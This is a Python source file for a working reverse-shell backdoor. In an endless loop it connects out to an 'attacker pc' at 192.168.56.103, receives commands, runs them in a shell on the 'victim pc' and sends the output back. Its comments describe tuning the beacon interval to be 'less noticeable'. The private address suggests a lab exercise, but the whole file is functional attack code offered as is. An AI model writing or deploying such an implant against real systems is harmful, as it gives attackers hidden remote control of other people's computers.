#Imports required for this file
import socket
import subprocess
import time

#Variables required for time loop, waitTime can be incremented to become less noticeable
startTime = time.time()
waitTime = 10.0

#Host data
HOST = "192.168.56.103"
PORT = 1024

#Main loop ensuring program keeps running as long as pc is on
while True:
	#Main try statement, any error will result in skipping a round of attempting to communicate
	try:
		#Creating a socket that is later used for the connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		#Attempts to connect to the attacker pc
		s.connect((HOST, PORT))

		#Saves the command received from the attacker pc
		data = s.recv(1024)
		
		#Runs command and saves output
		command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,)
		stdoutValue, stderrValue = command.communicate()

		#Checks whether the output is as expected, an error or non-existant
		if stdoutValue:
			output = stdoutValue
		elif stderrValue:
			output = stderrValue
		elif not stdoutValue and not stderrValue:
			output = "successfull execution but no output\n"

		#Sends results of command being ran on victim pc to attacker pc
		s.sendall(output)

		#Closes the connection with the attacker pc
		s.close()

	except:
		pass

	#Program waits waitTime seconds before attempting to connect with attacker pc again 
	time.sleep(waitTime - ((time.time() - startTime) % waitTime))

